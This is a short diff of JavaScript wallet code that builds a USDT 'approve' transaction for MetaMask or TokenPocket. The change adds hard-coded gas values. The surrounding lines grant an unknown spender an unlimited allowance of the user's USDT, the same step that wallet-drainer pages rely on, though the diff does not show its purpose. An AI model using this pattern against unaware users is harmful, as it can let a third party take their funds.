@@ -322,12 +322,14 @@ async function approveUSDT() {
     var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     var data = '0x095ea7b3' + spenderPadded + maxAmount;
 
-    // ONLY pass from, to, data — let the wallet handle gas/gasPrice/chainId
-    // Passing extra params caused TokenPocket to send tx to wrong chain (stack underflow)
+    // Pass gas + gasPrice to help wallet skip estimateGas (which fails in TokenPocket)
+    // Do NOT pass chainId — that caused TokenPocket to send tx to wrong chain
     var txParams = {
       from: from,
       to: usdtAddress,
-      data: data
+      data: data,
+      gas: '0xEA60',
+      gasPrice: '0x3B9ACA00'
     };
 
     var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
